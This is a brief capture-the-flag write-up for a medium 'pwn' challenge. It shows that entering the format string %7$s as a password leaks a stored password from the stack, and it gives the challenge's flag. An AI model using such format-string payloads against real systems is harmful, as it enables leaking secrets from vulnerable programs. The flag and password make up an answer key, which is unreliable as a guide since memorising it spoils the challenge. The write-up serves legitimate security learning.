---
layout: writeup

title: Thumper's PWN 3
level: 5 # optional, for events that use levels
difficulty: medium
points: 200
categories: [pwn]
tags: [format string]

flag: he2023{w3lc0m3_t0_r1ng_3_thump3r}

---

## Challenge

Thumper has been hunting his nemesis, Dr. Evil, for months. He finally located his remote system and is trying to gain access. Can you help him find the right password?

Target: `nc ch.hackyeaster.com 2313`

## Solution

we find out its a format string vulnerability and read values off the stack.

we get something interesting by giving `%7$s` as the password

```bash
$ nc ch.hackyeaster.com 2313

Welcome to the password protected vault
Please enter your password: %7$s
Nope..
5uP3R_s3cUr3_PW
is incorrect. Better luck next time
```

we use this password to log in and get our flag!

```bash
$ nc ch.hackyeaster.com 2313

Welcome to the password protected vault
Please enter your password: 5uP3R_s3cUr3_PW
Access granted, here is your flag:

he2023{w3lc0m3_t0_r1ng_3_thump3r}
```

